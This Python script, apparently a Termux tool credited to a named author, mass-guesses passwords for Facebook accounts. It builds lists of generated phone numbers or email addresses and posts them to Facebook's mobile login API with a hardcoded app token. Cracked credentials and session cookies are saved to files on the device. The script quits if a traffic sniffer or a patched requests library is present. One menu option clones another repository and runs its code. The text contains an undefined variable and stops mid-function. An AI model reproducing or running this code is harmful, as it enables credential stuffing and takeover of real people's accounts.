 ####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
	a = "anar"
	t="tt"
	fileee = os.listdir('/sdcard/Android/data/')
	if f'com.h{t}pc{a}y.pro' in fileee:
		print('Delete Http Canary');sys.exit()
except:pass

lm = '/data/data/com.termux/files/usr/lib/python3.11'
if not 'print' in open(lm+'/site-packages/requests/sessions.py','r').read():
	pass
else:sys.exit()

import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;92m[\033[1;92m'+str(t)+'\033[1;92m]\033[1;92m '

###USERAGENTSGEN####
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

ua = []

import requests
rs = requests.get
ua = []

del ua
"""
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPad5,3;FBMD/iPad;FBSN/iPadOS;FBSV/15.7.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (Linux; Android 11; Infinix X689B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 [FBAN/FBIOS;FBDV/iPad5,3;FBMD/iPad;FBSN/iPadOS;FBSV/15.7.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
"""

ua=[]

##Logo##
P = '\x1b[1;92m'
G='\x1b[1;92m'
R='\x1b[1;92m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

	
logo= f'''
  \033[1;92m ____             _____ _____ __  __ 
 \033[1;92m / __ \     /\    / ____|_   _|  \/  |
\033[1;92m | |  | |   /  \  | (___   | | | \  / |
\033[1;92m | |  | |  / /\ \  \___ \  | | | |\/| |
\033[1;92m | |__| | / ____ \ ____) |_| |_| |  | |
 \033[1;92m \___\_\/_/    \_\_____/|_____|_|  |_|
\033[1;95m--------------------------------------------------
\033[1;95m=================================
\033[1;92m Owner  : MUHAMMAD QASIM :/
\033[1;92m GitHub : QASIM-404 :/
\033[1;92m Version:\033[1;92m 0.1 \033[1;92m:/
\033[1;92m Status : Free :/
\033[1;92m Whatsapp: 03173289687
\033[1;95m ----------------------------.
\033[1;92m Notice : Use 100089/100090 For More OK Ids :/
\033[1;94m=================================
'''

####@-----Menu-----@####
def QAS_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}File Cloning")
    print(f"{oo(2)}Pak Random Cloning")
    print(f"{oo(3)}Gmail Cloning")  
    print(f"{oo(4)}Create File")
    print(f"{oo(0)}Exit")
    inpp = input(f"{oo('?')}Your Choice : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/QASIM -404/FILE')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.QASIM '
    else:
        file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        QAS_Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;92m---\033[1;96m"+gm.replace('huwtn',' QAS-code=QASIM -33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;92m---\033[1;93m"+gm.replace('riJan','QAS-182^)Code=QASIM -2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .QASIM ')
        first = input(f'{oo("?")}Put First Name: ')
        last = input(f'{oo("?")}Put Last Name: ')
        domain = input(f'{oo("?")}Put Domain: ')
        try:
            limit = input(f'{oo("?")}Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.QASIM ','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.QASIM ','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.QASIM ', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
	user=[]
	code = input(f'{oo("!")}Put Code : ')
	try:
		limit = int(input(f'{oo("?")}Put Limit :  '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()



####@-----UserAgent----@####
"""
Mozilla/5.0 (iPad; CPU OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad6,3;FBMD/iPad;FBSN/iOS;FBSV/13.1.2;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17A844 [FBAN/FBIOS;FBDV/iPad7,12;FBMD/iPad;FBSN/iOS;FBSV/13.1;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17A860 [FBAN/FBIOS;FBDV/iPad7,6;FBMD/iPad;FBSN/iOS;FBSV/13.1.2;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad7,11;FBMD/iPad;FBSN/iOS;FBSV/13.1.1;FBSS/2;FBID/tablet;FBLC/pt_BR;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17A878 [FBAN/FBIOS;FBDV/iPad6,12;FBMD/iPad;FBSN/iOS;FBSV/13.1.3;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad5,4;FBMD/iPad;FBSN/iOS;FBSV/13.1.2;FBSS/2;FBID/tablet;FBLC/pt_PT;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17A878 [FBAN/FBIOS;FBDV/iPad7,11;FBMD/iPad;FBSN/iOS;FBSV/13.1.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad5,4;FBMD/iPad;FBSN/iOS;FBSV/13.1.2;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17A860 [FBAN/FBIOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iOS;FBSV/13.1.2;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad7,11;FBMD/iPad;FBSN/iOS;FBSV/13.1;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iOS;FBSV/13.1.2;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad7,11;FBMD/iPad;FBSN/iOS;FBSV/13.1;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad6,4;FBMD/iPad;FBSN/iOS;FBSV/13.1.2;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad7,12;FBMD/iPad;FBSN/iOS;FBSV/13.2;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad6,11;FBMD/iPad;FBSN/iOS;FBSV/13.2;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad7,5;FBMD/iPad;FBSN/iOS;FBSV/13.1.3;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad11,1;FBMD/iPad;FBSN/iOS;FBSV/13.2;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad7,2;FBMD/iPad;FBSN/iOS;FBSV/13.2.3;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5;FBCR/]
Mozilla/5.0 (iPad; CPU OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad5,2;FBMD/iPad;FBSN/iOS;FBSV/13.1.2;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad6,3;FBMD/iPad;FBSN/iOS;FBSV/13.2;FBSS/2;FBID/tablet;FBLC/pt_BR;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad7,12;FBMD/iPad;FBSN/iOS;FBSV/13.1.1;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad7,5;FBMD/iPad;FBSN/iOS;FBSV/13.2;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5;FBCR/]
Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad7,6;FBMD/iPad;FBSN/iOS;FBSV/13.2.3;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (Linux; Android 10; Mi A2 Build/QKQ1.190920.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (Linux; Android 12; SM-G923U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]
Mozilla/5.0 (Linux; Android 9; POT-LX1A Build/HUAWEIPOT-L41B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]
Mozilla/5.0 (Linux; Android 11; Mi Note 10 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (Linux; Android 13; SM-G990B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/341.0.0.7.68;]
Mozilla/5.0 (Linux; Android 7.0; LG-M320 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/341.0.0.7.68;]
Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (Linux; Android 9; SM-A205G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (Linux; Android 8.1.0; SH-02L Build/S7100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.127 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
Mozilla/5.0 (Linux; Android 11; 220333QPG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GNews Android/2022116172
Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GNews Android/2022113920
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 11; moto g 5G plus Build/RPNS31.Q4U-39-27-5-23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (Linux; U; Android 4.1.2; nl-nl; GT-I9200 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 4.1.2; GT-N8013 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; U; Android 4.1.2; nl-nl; GT-P5110 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/Orca-Android;FBAV/388.0.0.23.106;]
Mozilla/5.0 (Linux; Android 5.1.1; Alcatel_4060A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/248.1.0.44.116;]
Mozilla/5.0 (Linux; Android 5.1.1; Alcatel_4060A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/164.0.0.44.95;]
Mozilla/5.0 (Linux; Android 5.1.1; Alcatel_4060A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/153.0.0.54.88;]
Mozilla/5.0 (Linux; Android 4.1.2; Transformer Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.59 Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 4.3; Nexus 10 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; U; Android 4.0.4; nl-nl; GT-N8010 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 4.1.2; GT-I9205P Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19 [FB_IAB/Orca-Android;FBAV/392.0.0.0.302;]
Mozilla/5.0 (Linux; Android 11; moto g 5G plus Build/RPNS31.Q4U-39-27-5-23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (Linux; Android 11; moto g 5G plus Build/RPNS31.Q4U-39-27-5-23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (Linux; Android 11; Infinix X689B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2; TEJB; AskTbFXTV5/5.9.1.14019; Zoom 3.6.0; MSOffice 12)
Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190920.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 Viber/14.7.0.4
Mozilla/5.0 (Linux; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 GSA/12.2.12.23.arm64
Mozilla/5.0 (Linux; Android 10; IN_Note1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 GSA/11.41.10.23.arm64
Mozilla/5.0 (Linux; Android 10; vivo 1938 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 GSA/12.4.9.23.arm64
Mozilla/5.0 (Linux; arm_64; Android 10; ZS620KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 YaBrowser/20.12.3.116.00 SA/3 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 10; SM-A315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 GSA/12.4.9.23.arm64
Mozilla/5.0 (Linux; Android 9; Q10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; ARE-L22HN Build/HONORARE-L22HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 GSA/12.4.9.23.arm64
"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/QASIM -OK.txt")
    print('\033[1;93m='*25)
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r \033[0;92m[\033[1;92mQAS-M1\033[1;92m]\033[1;92m {}-{} \033[1;92m[\033[1;92m{}\033[1;92m] \033[1;92mOK : \033[1;92m{} \033[1;92mCP : \033[1;92m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf92a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mQASIM -OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/QASIM -OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;92m[\033[1;92mQASIM -CP\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/QASIM -CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;92m[\033[1;92mQAS-M2\033[1;92m]\033[1;92m {}-{} \033[1;92m[\033[1;92m{}\033[1;92m] \033[1;92mOK : \033[1;92m{} \033[1;92mCP : \033[1;92m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf92a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mQASIM -OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;9m '+pword+'  ')
                open('/sdcard/QASIM -OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
